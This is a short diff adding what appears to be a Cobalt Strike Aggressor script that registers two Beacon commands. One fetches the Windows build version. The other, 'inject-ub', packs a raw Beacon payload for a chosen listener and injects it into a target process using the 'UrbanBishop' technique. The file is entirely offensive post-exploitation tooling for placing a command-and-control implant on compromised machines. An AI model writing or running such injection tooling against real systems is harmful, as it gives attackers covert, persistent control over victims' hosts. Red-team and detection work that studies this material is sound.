@@ -1,0 +1,29 @@
+alias getversion {
+    local('$barch $handle $data');
+    $barch  = barch($1);
+    $handle = openf(script_resource("getversion. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    beacon_inline_execute($1, $data, "go");
+}
+
+beacon_command_register(
+    "getversion",
+    "get windows major.minor.build version",
+    "Usage: getversion");
+
+alias inject-ub {
+    local('$barch $handle $data $payload $args');
+    $barch  = barch($1);
+    $handle = openf(script_resource("inject_urbanbishop. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    $payload = artifact_payload($3, "raw", $barch);
+    $args = bof_pack($1, "ib", $2, $payload);
+    beacon_inline_execute($1, $data, "inject", $args);
+}
+
+beacon_command_register(
+    "inject-ub",
+    "inject beacon using urbanbishop technique",
+    "Usage: inject-ub [pid] [listener]");
